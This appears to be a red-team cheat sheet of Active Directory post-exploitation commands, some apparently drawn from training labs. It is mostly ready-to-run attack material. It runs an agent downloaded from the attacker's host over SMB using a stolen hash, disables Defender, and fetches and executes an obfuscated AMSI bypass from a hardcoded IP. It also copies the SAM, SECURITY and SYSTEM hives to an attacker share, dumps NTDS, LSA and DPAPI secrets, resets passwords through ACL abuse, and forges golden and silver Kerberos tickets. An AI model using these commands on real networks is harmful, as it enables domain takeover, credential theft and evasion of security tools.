## AD Post-Exploit

### Netexec
```bash
nxc smb $TARGETIP -u $USER -H $HASH --exec-method smbexec -x "powershell -c curl $tun0:8080/agent.exe -o C:\Windows\Tasks\demon.exe; Start-Process C:\Windows\Tasks\demon.exe"
```

### Disable AV
```powershell
# Disable Real time Monitoring :
Set-MpPreference -DisableRealtimeMonitoring $true
# Disable all protection :
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
```
### Bypass AMSI
```powershell
# Payload generator
https://amsi.fail/

# Lots of payloads
https://swisskyrepo.github.io/InternalAllTheThings/redteam/evasion/windows-amsi-bypass

# Download the bypass and execute it
powershell "IEX(New-Object Net.WebClient).DownloadString('http://89.34.27.167/lol.ps1')"

# In lol.ps1, simple payload
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('oma'+'t'+'ion.'),'.A',('Ams'+'iUt'),'ls',('S'+'ystem.'+'Manage'+'men'+'t'),'i')).GetField(("{1}{2}{0}" -f ('Co'+'n'+'text'),('am'+'s'),'i'),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic,Sta'+'ti'),'c','P','u',('N'+'on'))).GetValue($null),0x41414141)
```

### Dump SAM LSA SECRET
```bash
smbserver.py -smb2support EXEGOL .
```

```cmd
reg.exe save hklm\sam C:\Windows\Tasks\sam.save
reg.exe save hklm\security C:\Windows\Tasks\security.save
reg.exe save hklm\system C:\Windows\Tasks\system.save

move sam.save \\LHOST\EXEGOL
move security.save \\LHOST\EXEGOL
move system.save \\LHOST\EXEGOL
```

### Dump everything !!
```bash
nxc smb $RHOST -u $USER -p $PASSWORD --lsa --sam --dpapi --ntds
```

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

### Enum trust
```powershell
Import-Module activedirectory
Get-ADTrust -Filter *
``` 

### Linux & AD
```bash
realm list
ps -ef | grep -i "winbind|sssd"
find / -name keytab -ls 2>/dev/null
env | grep -i krb5
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

### Enumerating Security Controls
```powershell
$ExecutionContext.SessionState.LanguageMode
Find-LAPSDelegatedGroups
Find-AdmPwdExtendedRights
Get-LAPSComputers
Get-MpComputerStatus
sc query windefend
```

### Powershell misc
```powershell
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"
Find-InterestingDomainAcl
Find-InterestingDomainShareFile
# Enumerates local groups on the local or a remote machine
Get-NetLocalGroup
# Enumerates members of a specific local group
Get-NetLocalGroupMember
# Returns open shares on the local (or a remote) machine
Get-NetShare
# Will return session information for the local (or a remote) machine
Get-NetSession
# Tests if the current user has administrative access to the local (or a remote) machine
Test-AdminAccess
```

### Snaffler
```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

### Users
```powershell
qwinsta
net user /domain $USERNAME
```


### ACL Abuse
```powershell
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid $USERNAME

Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
Get-DomainGroup -Identity "GROUP NAME" | select memberof 
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

# PSCredential Object (Import-Module .\PowerView.ps1)
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

# Create Fake SPN
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

# Add and Remove user from group
Add-DomainGroupMember -Identity "GROUP NAME" -Members '$USER' -Credential $Cred2 -Verbose
Remove-DomainGroupMember -Identity "GROUP NAME" -Members '$USER' -Credential $Cred2 -Verbose
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

### Retrive Deleted Objects
```powershell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
Restore-ADObject -Identity <GUID of the object deleted>
```

### Silver Tickets
```bash
https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver

# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0
# with an NT hash
python ticketer.py -nthash "$NT_HASH" -domain-sid "$DomainSID" -domain "$DOMAIN" -spn "$SPN" "username"
# with an AES (128 or 256 bits) key
python ticketer.py -aesKey "$AESkey" -domain-sid "$DomainSID" -domain "$DOMAIN" -spn "$SPN" "username"
```

### Golden Tickets
```bash
https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# Create the golden ticket (with an RC4 key, i.e. NT hash)
ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser"

# Create the golden ticket (with an AES 128/256bits key)
ticketer.py -aesKey "$krbtgtAESkey" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser"

# Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -user-id "$USERID" -groups "$GROUPID1,$GROUPID2,..." "randomuser"
```

### Network
```cmd
route print
arp -a
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```

### Firewall
```cmd
netsh advfirewall show allprofiles
```
